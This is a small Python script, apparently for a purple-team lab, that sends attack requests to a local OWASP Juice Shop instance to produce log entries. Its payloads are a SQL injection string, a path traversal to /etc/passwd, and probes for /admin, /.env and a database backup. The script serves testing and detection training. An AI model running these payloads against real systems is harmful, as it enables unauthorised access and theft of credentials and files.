import urllib.request
import urllib.parse
import urllib.error
import time

BASE_URL = "http://localhost:3000"

sqli_payload = urllib.parse.quote("'OR'1'='1")

PAYLOADS = [
    (f"/rest/products/search?q={sqli_payload}", "SQL Injection - Product Search"),
    ("/rest/user/login", "SQL Injection - Login Bypass"),
    ("/public/images/../../../../etc/passwd", "Path Traversal"),
    ("/admin", "Directory Enumeration - Admin"),
    ("/.env", "Directory Enumeration - Sensitive File"),
    ("/db_backup", "Directory Enumeration - Backup")
]

def run_attack():
    print("[*] Iniciando simulação de ataques contra o Juice Shop...\n")
    for endpoint, attack_type in PAYLOADS:
        url = f"{BASE_URL}{endpoint}"
        print(f"[+] Testando: {attack_type} -> {url}")
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'PurpleTeam-Lab-Scanner'})
            with urllib.request.urlopen(req) as response:
                print(f"    Status: {response.status}")
        except urllib.error.HTTPError as e:
            print(f"    Status: {e.code} (Capturado nos logs)")
        except Exception as e:
            print(f"    Erro na conexão: {e}")
        time.sleep(1)

if __name__ == "__main__":
    run_attack()
